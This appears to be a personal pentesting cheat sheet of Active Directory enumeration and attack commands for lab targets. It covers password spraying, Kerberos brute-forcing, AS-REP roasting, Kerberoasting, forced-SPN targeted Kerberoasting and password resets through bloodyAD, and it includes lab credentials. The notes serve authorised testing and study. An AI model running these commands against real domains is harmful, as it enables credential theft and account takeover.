## AD Checklist - Remote Enumeration

Run through all of the relevant ports' mds. All privilege escalation and local enumeration is is windows-enumeration.md.




sprayhound



```bash
nxc smb 192.168.165.40
export ip=192.168.165.40; export dom=hokkaido-aerospace.com; export dc=dc.hokkaido-aerospace.com;clear

sudo autorecon $ip --subdomain-enum.domain $dom --global.domain $dom

sudo ntpdate $ip

enum4linux -a $ip
enum4linux -a -M -l -d $ip 2>&1
enum4linux -a -u "$dom\\$user" -p "winniethepooh" $ip
enum4linux -a -u "$dom\\$user" -p "" -M -l -d $ip 2>&1
enum4linux -a -u "" -p "" $ip && enum4linux -a -u "guest" -p "" $ip
enum4linux -a -M -l -d $dom 2>&1 && enum4linux-ng $dom -A -C

enum4linux-ng $ip
enum4linux-ng $ip -A -C
enum4linux-ng $ip -u $user -p $pass -oY out

smbclient -L //$ip
smbclient -N -L //$ip
smbclient -L //$ip -N

nxc smb $ip -u 'a' -p '' --shares
nxc smb $ip -u 'a' -p '' --all
nxc smb $ip -u 'guest' -p '' --shares
nxc smb $ip -u 'administrator' -p 'fake' --shares
nxc smb $ip -u '' -p 'fake' --shares
nxc smb $ip -u users.txt -p users.txt --no-bruteforce --continue-on-success
nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute
nxc smb $ip -u ‘guest’ -p ‘’ --rid-brute > u.txt
smbmap -u "" -p "" -P 445 -H $ip && smbmap -u "guest" -p "" -P 445 -H $ip
smbclient -U '%' -L //$ip && smbclient -U 'guest%' -L //

rpcclient -U "admin" $ip 
rpcclient $ip -N -U ""

# Check if password policy was manually made easier, hidden passwords
ldapsearch -x -H ldap://$ip
ldapsearch -x -H ldap://$ip -s base namingcontexts
ldapsearch -x -H ldap://$ip -b "DC=,DC="
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)'
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' sAMAccountName sAMAccountType
ldapsearch -x -H ldap://$ip -b "DC=DomainDnsZones,DC=,DC="
ldapsearch -H ldap://$ip -D "$user@$dom" -w "$pass" -b 'dc=,dc='
ldapsearch -x -H ldap://$ip -b "DC=,DC=" | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:"
ldapsearch -x -H ldap://$ip -b "DC=,DC=" '(objectClass=Person)' | grep -vi "objectClass\|distinguishedName\|instanceType\|whenCreated\|whenChanged\|uSNCreated\|uSNChanged\|objectGUID\|userAccountControl\|codePage\|countryCode\|objectSid\|accountExpires\|sAMAccountType\|isCriticalSystemObject\|dSCorePropagationData\|lastLogonTimestamp\|showInAdvancedViewOnly\|groupType\|msDS-SupportedEncryptionTypes:\|lastLogoff\|badPasswordTime\|ref:\|#\ num\|#\ search\|search:\|result:" | grep -i "pass\|pwd"
ldapdomaindump $ip [-r <IP>] -u "$dom\$user" -p 'pass' [--authtype SIMPLE] --no-json --no-grep [-o /path/dir]
ldapsearch -LLL -x -H ldap://$ip -b'' -s base '(objectclass=\*)'/opt/legba/legba ldap --target $ip:389 --username nagoya --password custom-passwords.txt --ldap-domain $dom --single-match
ldapdomaindump $dom
ldapdomaindump -u $user -p $pass --no-json --no-grep $dom
python ldapper.py -D 'EMP' -U 'bob' -P 'password' -S '10.0.0.2,10.0.0.3' -m 0  -s '(cn=*)' cn
python ldapper.py -D 'domain' -U 'user' -P 'pass' --server $dom --maxrecords 0 --search 1 | grep samaccountname | awk -F':' '{print $2}' > usernames.txt
bloodhound-python -d $dom -v --zip -c All -dc $ip -ns 192.168.179.21
bloodhound-python -u $user -p $pass -d $dom -v --zip -c All -dc $dc -ns $ip

# If you attempt to authenticate to an AD server via Kerberos, it's going to say 'hey, continue with pre-authentication'. It doesn't do that with invalid names.
/opt/kerbrute userenum usernames.txt -d "$dom" --dc $ip
/opt/kerbrute userenum -d $dom --dc $ip /opt/SecLists/Usernames/xato-net-10-million-usernames-dup-lowercase.txt -t 100
/opt/kerbrute bruteuser -d $dom ../passwords.txt maintenance --dc $ip
/opt/kerbrute bruteforce combo.txt -d $dom --dc $ip

psexec.py

impacket-GetADUsers -dc-ip $ip "$dom/" -all
impacket-GetADUsers -dc-ip $ip $dom/$user:$pass -all

# Even if you don't have a password, use their username to auth
GetNPUsers.py -request -format hashcat -outputfile asrep.txt "$dom/$user"
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip '$dom/'
GetNPUsers.py -request -format hashcat -outputfile asrep.txt -dc-ip $ip $dom/$user:$pass
GetNPUsers.py $dom/ -dc-ip $ip -usersfile users.txt -format hashcat -outputfile hashes.txt

impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip '$dom/'
impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip $ip $dom/$user:$pass

/opt/windows/nxc.sh $ip

impacket-mssqlclient $user:$pass@$ip -windows-auth
impacket-mssqlclient $dom/$user:$pass@$ip -windows-auth
nxc mssql -d $dom -u discovery -p 'Start123!' -x "whoami" 192.168.165.40 -q 'SELECT name FROM master.dbo.sysdatabases;'
nxc mssql -d $dom -u discovery -p 'Start123!' -x "whoami" 192.168.165.40 -q 'use hrappdb; select * from hrappdb..sysobjects;' --port 58538 -M mssql_priv

source /opt/targetedKerberoast/venv/bin/activate
python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip
python /opt/targetedKerberoast/targetedKerberoast.py -d $dom -u $user -p $pass --dc-ip $ip -o kerberload.txt
python /opt/windows/targetedKerberoast/targetedKerberoast.py -d $dom -u 'hrapp-service' -p 'Untimed$Runny' --dc-ip $ip

bloodyAD --host $ip -d $dom -u $user -p $pass get writable --otype USER --right WRITE --detail | egrep -i 'distinguishedName|servicePrincipalName' # Check for interesting permissions on accounts:
bloodyAD --host $ip -d $dom -u $user -p $pass get object $user --attr servicePrincipalName # Check if current user has already an SPN setted:
bloodyAD --host $ip -d $dom -u $user -p $pass set object servicePrincipalName $target -v 'ops/whatever1' # Force set the SPN on the account: Targeted Kerberoasting
impacket-GetUserSPNs -dc-ip $ip "$dom/$user:$pass" -request-user "target" # Grab the ticket
bloodyAD --host $ip -d $dom -u $user -p $pass set object $user servicePrincipalName # Grab the ticket
python /opt/windows/bloodyAD/bloodyAD.py --host $ip -d $dom -u $user -p $pass set password 'iain.white' "$pass" # GenericAll or GenericWrite

Invoke-adPEAS -Domain 'access.offsec' -Server 'dc.access.offsec' -Username 'access\svc_mssql' -Password 'trustno1' -Force
Invoke-ADEnum -AllEnum -Force
.\pingcastle.exe --healthcheck --user access\svc_mssql --password trustno1 --level Full

.\Seatbelt.exe -group=all
```rdate -n $dcip
